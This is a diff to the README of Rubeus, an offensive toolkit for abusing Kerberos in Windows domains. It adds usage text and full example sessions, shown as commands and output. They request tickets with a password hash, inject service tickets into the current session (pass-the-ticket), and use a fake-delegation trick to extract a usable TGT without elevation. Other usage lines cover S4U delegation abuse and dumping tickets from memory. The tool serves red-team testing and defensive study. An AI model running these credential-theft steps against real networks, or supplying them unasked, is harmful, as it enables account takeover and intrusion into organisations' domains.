@@ -2,9 +2,11 @@
 
 ----
 
-Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 licence) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.
+Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.
 
 Rubeus also uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an "MIT-like" license. Huge thanks to Thomas for his clean and stable code!
+
+The [KerberosRequestorSecurityToken.GetRequest](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method for Kerberoasting was contributed to PowerView by [@machosec](https://twitter.com/machosec).
 
 [@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base.
 
@@ -23,6 +25,9 @@ Rubeus is licensed under the BSD 3-Clause license.
 
     Renew a TGT, optionally appling the ticket or auto-renewing the ticket up to its renew-till limit:
         Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
+
+    Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
+        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]
 
     Perform S4U constrained delegation abuse:
         Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
@@ -51,6 +56,9 @@ Rubeus is licensed under the BSD 3-Clause license.
 
     Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
         Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+
+    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
+        Rubeus.exe tgtdeleg [/target:SPN]
 
     Monitor every SECONDS (default 60 seconds) for 4624 logon events and dump any TGT data for new logon sessions:
         Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]
@@ -209,6 +217,104 @@ C:\Rubeus>Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
     [*] renew-till : 9/30/2018 10:34:05 PM
     [*] Sleeping for 269 minutes (endTime-30) before the next renewal
 
+
+## asktgs
+
+The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT /ticket:X supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a /dc is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The /ptt flag will "pass-the-ticket" and apply the resulting service ticket to the current logon session. One or more /service:X SPNs must be specified, comma separated.
+
+    C:\Temp\tickets>Rubeus.exe asktgt /user:harmj0y /rc4:2b576acbe6bcfda7294d6bd18041b8fe
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.0.0
+
+    [*] Action: Ask TGT
+
+    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\harmj0y'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 232 bytes
+    [*] Received 1405 bytes
+    [+] TGT request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFFjCCBRKgAwIBBa...(snip)...
+
+    C:\Temp\tickets>Rubeus.exe asktgs /ticket:doIFFjCCBRKgAwIBBa...(snip...)== /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.0.0
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building TGS-REQ request for: 'LDAP/primary.testlab.local'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 1384 bytes
+    [*] Received 1430 bytes
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFSjCCBUagAwIBBaEDA...(snip)...
+
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Building TGS-REQ request for: 'cifs/primary.testlab.local'
+    [*] Connecting to 192.168.52.100:88
+    [*] Sent 1384 bytes
+    [*] Received 1430 bytes
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFSjCCBUagAwIBBaEDAgE...(snip)...
+
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+
+
+    C:\Temp\tickets>C:\Windows\System32\klist.exe tickets
+
+    Current LogonId is 0:0x570ba
+
+    Cached Tickets: (2)
+
+    #0>     Client: harmj0y @ TESTLAB.LOCAL
+            Server: cifs/primary.testlab.local @ TESTLAB.LOCAL
+            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+            Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+            Start Time: 9/30/2018 18:17:55 (local)
+            End Time:   9/30/2018 23:17:01 (local)
+            Renew Time: 10/7/2018 18:17:01 (local)
+            Session Key Type: AES-128-CTS-HMAC-SHA1-96
+            Cache Flags: 0
+            Kdc Called:
+
+    #1>     Client: harmj0y @ TESTLAB.LOCAL
+            Server: LDAP/primary.testlab.local @ TESTLAB.LOCAL
+            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+            Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+            Start Time: 9/30/2018 18:17:55 (local)
+            End Time:   9/30/2018 23:17:01 (local)
+            Renew Time: 10/7/2018 18:17:01 (local)
+            Session Key Type: AES-128-CTS-HMAC-SHA1-96
+            Cache Flags: 0
+            Kdc Called:
 
 ## s4u
 
@@ -581,7 +687,38 @@ The **dump** action will extract current TGTs and service tickets from memory, i
     [*] Enumerated 4 total tickets
     [*] Extracted  1 total tickets
 
-**Note that this action needs to be run from an elevated context!**
+**Note that this action needs to be run from an elevated context to extract usable TGTs!**
+
+
+## tgtdeleg
+
+The **tgtdeleg** using [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) trick (**tgt::deleg**) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user's Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.
+
+    C:\Rubeus>Rubeus.exe tgtdeleg
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v1.1.0
+
+
+    [*] Action: Request Fake Delegation TGT (current user)
+
+    [*] No target SPN specified, attempting to build 'HOST/dc.domain.com'
+    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'HOST/PRIMARY.testlab.local'
+    [+] Kerberos GSS-API initialization success!
+    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+    [*] Found the AP-REQ delegation ticket in the GSS-API output.
+    [*] Authenticator etype: aes256_cts_hmac_sha1
+    [*] Extracted the service ticket session key from the ticket cache: PrrVTn8MgR52epjaG5YnvZMAeCn1TnJn8QfuMh9lvw8=
+    [+] Successfully decrypted the authenticator
+    [*] base64(ticket.kirbi):
+
+          doIFNjCCBTKgAwIBBaE...(snip)...
 
 
 ## monitor
